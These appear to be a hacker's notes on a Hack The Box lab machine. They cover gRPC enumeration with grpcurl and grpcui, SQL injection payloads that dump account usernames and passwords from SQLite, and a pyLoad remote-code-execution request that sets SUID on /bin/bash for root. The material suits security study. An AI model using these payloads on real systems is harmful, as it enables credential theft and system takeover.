```

sudo docker run fullstorydev/grpcurl -plaintext 10.10.11.214:50051 describe 

SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}
grpc.reflection.v1alpha.ServerReflection is a service:
service ServerReflection {
  rpc ServerReflectionInfo ( stream .grpc.reflection.v1alpha.ServerReflectionRequest ) returns ( stream .grpc.reflection.v1alpha.ServerReflectionResponse );
}

sudo docker run fullstorydev/grpcurl -vv -plaintext -d '{
  "username": "jack pearce",
  "password": "jack"
}' 10.10.11.214:50051 SimpleApp.RegisterUser   

 sudo docker run fullstorydev/grpcurl -vv -plaintext -d '{
  "username": "jack pearce",
  "password": "jack"
}' 10.10.11.214:50051 SimpleApp.LoginUser

Unable to fetch the request , changed to grpcui

./grpcui -plaintext pc.htb:50051

intercept the request of SimpleApp.getInfo

send to burp repeater , found sql injection

0 union select sqlite_version();

0 union SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'

"id":"0 union SELECT group_concat(username || \",\" || password || \":\") from accounts"}


root : port forward 8000 , google search
![image](https://github.com/J4CKMEISTER/HTB-Notes/assets/78603128/82655520-d3a3-4f21-aade-35f74041c8fe)
https://github.com/advisories/GHSA-pf38-5p22-x6h6

change to chmod u+s /bin/bash

curl -X POST 127.0.0.1:8000/flash/addcrypted2 -d 'jk=pyimport%20os%3Bos%2Esystem%28%22chmod%20u%2Bs%20%2Fbin%2Fbash%22%29;f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'

```
